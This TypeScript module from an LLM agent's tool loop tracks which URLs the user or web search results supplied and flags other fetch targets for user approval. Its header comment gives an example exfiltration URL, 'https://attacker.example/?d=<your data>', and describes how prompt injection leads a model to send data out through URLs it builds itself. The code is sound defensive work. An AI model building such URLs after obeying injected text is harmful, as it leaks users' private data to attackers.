import type * as Llm from '../llm-types.js';

/**
 * Where a URL came from. Claude and Gemini fetch without asking because they only open addresses that are already in
 * the conversation: typed by the user, or returned by search / an earlier fetch. A URL the model builds itself
 * (`https://attacker.example/?d=<your data>`) is the exfiltration channel after a prompt injection, so such a URL has
 * to be approved by the user (per domain, see llm-loop).
 *
 *  - user-typed URL or bare domain  → every page of that HOST is fine (the user chose the site);
 *  - URL in a web_search / web_fetch result → exactly that URL (host + path + query), nothing appended.
 * Text written by the model is never a source.
 */

export interface ContextUrls {
  /** `host/path?query` of URLs seen in search/fetch results. */
  exact: Set<string>;
  /** Hosts the user named. */
  hosts: Set<string>;
}

const URL_RE = /https?:\/\/[^\s<>"'`]+/gi;
const BARE_RE = /\b(?:[a-z0-9-]+\.)+[a-z]{2,}\b(?:\/[^\s<>"'`]*)?/gi;
const WEB_RESULT_TOOLS = new Set(['web_search', 'web_fetch']);

function trimUrl(raw: string): string {
  let s = raw;
  for (;;) {
    const last = s[s.length - 1];
    if (last === undefined) return s;
    if (/[.,;:!?\]}>*\\]/.test(last)) { s = s.slice(0, -1); continue; }
    if (last === ')' && (s.match(/\)/g) ?? []).length > (s.match(/\(/g) ?? []).length) { s = s.slice(0, -1); continue; }
    return s;
  }
}

/** `host/path?query` without scheme, fragment and a trailing slash; null when it is not a web URL. */
export function urlKey(raw: string): { host: string; key: string } | null {
  let u: URL;
  try { u = new URL(raw.trim()); } catch { return null; }
  if (u.protocol !== 'http:' && u.protocol !== 'https:') return null;
  const host = u.hostname.toLowerCase().replace(/\.$/, '');
  if (!host) return null;
  const path = u.pathname.replace(/\/+$/, '');
  return { host, key: `${host}${u.port ? `:${u.port}` : ''}${path}${u.search}` };
}

function textOf(content: Llm.MessageParam['content']): string[] {
  if (typeof content === 'string') return [content];
  const out: string[] = [];
  for (const b of content) if (b.type === 'text') out.push(b.text);
  return out;
}

function resultText(content: unknown): string {
  if (typeof content === 'string') return content;
  if (Array.isArray(content)) return content.map(c => (c && typeof c === 'object' && 'text' in c ? String((c as { text: unknown }).text) : '')).join('\n');
  return '';
}

export function collectContextUrls(messages: Llm.MessageParam[], opts: { trustUserText: boolean }): ContextUrls {
  const toolNames = new Map<string, string>();
  for (const m of messages) {
    if (m.role !== 'assistant' || typeof m.content === 'string') continue;
    for (const b of m.content) if (b.type === 'tool_use') toolNames.set(b.id, b.name);
  }
  const ctx: ContextUrls = { exact: new Set(), hosts: new Set() };
  for (const m of messages) {
    if (m.role !== 'user') continue;
    if (opts.trustUserText) {
      for (const t of textOf(m.content)) {
        for (const match of t.match(URL_RE) ?? []) {
          const k = urlKey(trimUrl(match));
          if (k) ctx.hosts.add(k.host);
        }
        for (const match of t.match(BARE_RE) ?? []) {
          const k = urlKey(`https://${trimUrl(match)}`);
          if (k) ctx.hosts.add(k.host);
        }
      }
    }
    if (typeof m.content === 'string') continue;
    for (const b of m.content) {
      if (b.type !== 'tool_result' || !WEB_RESULT_TOOLS.has(toolNames.get(b.tool_use_id) ?? '')) continue;
      for (const match of resultText(b.content).match(URL_RE) ?? []) {
        const k = urlKey(trimUrl(match));
        if (k) ctx.exact.add(k.key);
      }
    }
  }
  return ctx;
}

export function urlIsInContext(rawUrl: string, ctx: ContextUrls): boolean {
  const k = urlKey(rawUrl);
  return !!k && (ctx.hosts.has(k.host) || ctx.exact.has(k.key));
}
